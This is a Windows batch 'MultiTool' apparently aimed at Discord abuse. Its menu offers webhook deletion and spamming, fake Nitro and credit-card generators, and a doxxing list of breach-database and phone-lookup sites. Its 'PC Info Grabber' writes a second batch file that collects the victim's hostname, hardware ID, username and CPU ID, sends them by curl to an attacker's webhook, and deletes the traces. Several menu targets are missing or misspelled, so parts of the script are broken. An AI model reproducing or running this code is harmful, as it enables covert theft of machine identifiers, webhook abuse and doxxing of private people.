@echo off
cls
title Concerfate's MultiTool
chcp 65001 >nul
color 1
goto banner

:banner
echo.
echo.
echo		 ██████╗ ██████╗ ███╗   ██╗ ██████╗███████╗██████╗ ███████╗ █████╗ ████████╗███████╗███████╗
echo		██╔════╝██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝
echo		██║     ██║   ██║██╔██╗ ██║██║     █████╗  ██████╔╝█████╗  ███████║   ██║   █████╗  ███████╗
echo		██║     ██║   ██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ╚════██║
echo		╚██████╗╚██████╔╝██║ ╚████║╚██████╗███████╗██║  ██║██║     ██║  ██║   ██║   ███████╗███████║
echo		 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝
echo.                                                                                            
echo		███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗                         
echo		████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║                         
echo		██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║                         
echo		██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║                         
echo		██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗                    
echo		╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝        
echo.
echo.
echo.
echo.
echo ___________________________________________________
echo.
echo [1] GitHub
echo [2] Destroy Webhook
echo [3] Webhook Spammer
echo [4] IP Configuration
echo [5] Ping an IP Address
echo [6] Generate Nitro Codes
echo [7] URL Shortener
echo [8] Grab IP Info and Send to Webhook
echo [9] IP Geo Lookup
echo [10] Delete Channels and Kick Everyone
echo [11] Credit Card
echo [12] PC Info Grabber
echo [13] Doxxing Tools
echo [14] exit
echo.
set /p choice="Choose an option (1-15): "

if "%choice%"=="1" goto github
if "%choice%"=="2" goto destroy_webhook
if "%choice%"=="3" goto webhook_spammer
if "%choice%"=="4" goto check_ip
if "%choice%"=="5" goto ping_ip
if "%choice%"=="6" goto generate_nitro
if "%choice%"=="7" goto url_shortener
if "%choice%"=="8" goto grab_ip_info
if "%choice%"=="9" goto ip_geo_lookup
if "%choice%"=="10" goto delete_channels_and_kick
if "%choice%"=="11" goto cc
if "%choice%"=="12" goto pc
if "%choice%"=="13" goto doxxintoolif "%choice%"=="15" goto ip_grabber
if "%choice%"=="14" goto exit

echo Invalid choice, try again
pause 
goto banner         

:github
cls
echo Opening my GitHub...
start https://github.com/Concerfate      
goto banner

:destroy_webhook
cls
set /p webhook_url="Enter the Webhook URL to destroy: "
echo Sending request to delete the webhook...
curl -X DELETE "%webhook_url%"
echo Webhook destroyed!
pause
goto banner                                                                       

:webhook_spammer
cls
set /p webhook_url="Enter the Webhook URL to spam: "
set /p message="Enter the message to spam: "
set /p count="Enter the number of messages to spam: "

echo Spamming the webhook...

for /l %%i in (1,1,%count%) do (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %webhook_url%
    echo Sent message %%i/%count%
)

echo Done spamming!
pause
goto banner

:check_ip
cls
echo Checking your IP configuration...

REM Get the device's IP address
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do set "device_ip=%%i"
set device_ip=%device_ip:~1%

REM Get the router's (default gateway) IP address
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "Default Gateway"') do set "router_ip=%%i"
set router_ip=%router_ip:~1%

REM Get the public external IP using curl
for /f "tokens=* delims=" %%i in ('curl -s ifconfig.me') do set "public_ip=%%i"

REM Display the results
echo.
echo Device IP Address: %device_ip%
echo Router IP (Default Gateway): %router_ip%
echo Public External IP: %public_ip%

pause
goto banner


:ping_ip
set /p target_ip=Enter the IP address to ping:
ping %target_ip%
pause
goto banner

:generate_nitro
cls
echo Generating Discord Nitro Codes...

setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "num_codes=10"
set "code_length=16"

for /l %%i in (1,1,%num_codes%) do (
    set "code="
    for /l %%j in (1,1,%code_length%) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "code=!code!!characters:~%%k,1!"
        )
    )
	echo These codes do not work, if you keep running it, a working code might show up.
    echo https://discord.gift/!code!
)

endlocal
pause
goto banner

:url_shortener
set /p url=Enter the URL to shorten:
echo Shortened URL: http://tinyurl.com/api-create.php?url=%url%
pause
goto menu
:ip_geo_lookup
echo IpGeoLookup does not exist in this batch file, it can be found as a C# file to download on my website.
pause
goto banner

:cc
cls
echo  ██████╗██████╗ ███████╗██████╗ ██╗████████╗     ██████╗ █████╗ ██████╗ ██████╗ 
echo ██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝    ██╔════╝██╔══██╗██╔══██╗██╔══██╗
echo ██║     ██████╔╝█████╗  ██║  ██║██║   ██║       ██║     ███████║██████╔╝██║  ██║
echo ██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║       ██║     ██╔══██║██╔══██╗██║  ██║
echo ╚██████╗██║  ██║███████╗██████╔╝██║   ██║       ╚██████╗██║  ██║██║  ██║██████╔╝
echo  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝        ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
echo.


set /p webhook_url=Enter [!] webhook: 


set /a BIN=400000+(%random% %% 100000)
set /a ACCOUNT=%random%%%1000000000
set EXP_MONTH=%random:~-2,2%
set EXP_YEAR=20%random:~-2,2%
set /a CVV=%random%%%900+100


setlocal enabledelayedexpansion
set message=**CREDIT CARD INFO**^nCard Number: %BIN%%ACCOUNT%^nExpiration Date: %EXP_MONTH%/%EXP_YEAR%^nCVV: %CVV%


echo SENDING [!] CARD TO WEBHOOK
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"!message!\"}" %webhook_url% >nul 2>&1


if %errorlevel% neq 0 (
    echo.
    echo Error: [!]FAILED[!] 
    pause
    goto banner
)

echo SENDED [!]
endlocal
pause
goto banner

:pc
cls
echo ██████╗  ██████╗    ██╗███╗   ██╗███████╗ ██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
echo ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo ██████╔╝██║         ██║██╔██╗ ██║█████╗  ██║   ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
echo ██╔═══╝ ██║         ██║██║╚██╗██║██╔══╝  ██║   ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
echo ██║     ╚██████╗    ██║██║ ╚████║██║     ╚██████╔╝    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
echo ╚═╝      ╚═════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                                               
echo    _______
echo ---'    ____)____
echo            ______)
echo           _______)
echo          _______)
echo ---.__________)     

                                                                                                                          
set /p "webhook=Type in you're discord webhook to build pc grabber( "



if "%webhook%"=="" (
echo                                           ┌────────────────────────┐
    echo                                           │ :Invalid...│  Webhook  │ 
    echo                                           └────────────────────────┘
    pause
    goto menu
)

echo @echo off > pc_info_grabber_exec.bat
echo hostname^>pcname.txt >> pc_info_grabber_exec.bat
echo wmic csproduct get uuid^>hwid.txt >> pc_info_grabber_exec.bat 
echo echo %%username%%^>pcusername.txt >> pc_info_grabber_exec.bat
echo wmic cpu get processorid^>cpuid.txt >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"hwid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"cpuid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcname.txt" %webhook% >> pc_info_grabber_exec.bat
echo del pcname.txt >> pc_info_grabber_exec.bat
echo del hwid.txt >> pc_info_grabber_exec.bat
echo del pcusername.txt >> pc_info_grabber_exec.bat
echo del cpuid.txt >> pc_info_grabber_exec.bat

echo PC information grabber script has been created as pc_info_grabber_exec.bat...
echo You Can Find It In Ur Display...
pause
goto menu

:doxxintools
cls
echo [96m╔════════════════════════╗
echo ║     [31m?leaksearch?       [96m║
echo [96m╚════════════════════════╝   
 echo [96mhttps://intelx.io                                           
 echo [96mhttps://leakpeek.com                                        
 echo [96mhttps://leak-lookup.com                                     
 echo [96mhttps://snusbase.com/search                                 
 echo [96mhttps://haveibeenpwned.com                                  
 echo [96mhttps://www.dehashed.com/                                    
 echo [96mhttps://cybernews.com/personal-data-leak-check              
 echo [96mhttps://breachdirectory.com/search                          
 echo [96mhttps://breachdirectory.org                                 
 echo [96mhttps://leakcheck.net                                       
 echo [96mhttps://breachdbsztfykg2fdaq2gnqnxfsbj5d....onion.pet       
 echo [96mhttps://aleph.occrp.org                                     
 echo [96mhttps://checkleaked.cc                                      
 echo [96mhttps://namescan.io/freeemailcompromisedcheck               
 echo [96mhttps://monitor.firefox.com                                 
 echo [96mhttps://www.fasterbroadband.co.uk/tools/...ach-search       
 echo [96mhttps://www.hotsheet.com/inoitsu                            
 echo [96mhttps://checkashleymadison.com                              
 echo [96mhttps://surfshark.com                                       
 echo [96mhttps://tragercop.1password.com                             
 echo [96mhttps://ghostproject.fr                                     
 echo [96mhttps://saverudata.online/ (RussinLeak DB search)           
echo [96m╔════════════════════════╗                                
echo ║     [31m?PhoneSearch?      [96m║                          
echo [96m╚════════════════════════╝                          
echo [96mhttps://www.spydialer.com                         
echo [96mhttps://www.numlookup.com                         
echo [96mhttps://www.truecaller.com                        
echo [96mhttps://www.searchyellowdirectory.com             
echo [96mhttps://demo.phoneinfoga.crvx.fr                  
echo [96mhttps://onlinesim.io                              
echo [96mhttps://www.411.com                               
echo [96mhttps://411.info                                  
echo [96mhttps://www.calleridtest.com                      
echo [96mhttps://thatsthem.com/reverse-phone-lookup        
echo [96mhttp://www.fonefinder.net                         
echo [96mhttps://www.callersmart.com                      
echo [96mhttps://www.phonevalidator.com                   
echo [96mhttps://freecarrierlookup.com                     
echo [96mhttps://www.usphonebook.com                      
echo [96mhttps://pccare99.com                              
echo [96mhttps://www.numberguru.com                        
echo [96mhttps://www.calltruth.com/                        
echo [96mhttps://www.allareacodes.com                      
echo [96mhttps://www.peoplebyphone.com                     
echo [96mhttps://www.confidentialphonelookup.com           

pause
goto menu

:exit
cls
echo Exiting...
pause
exit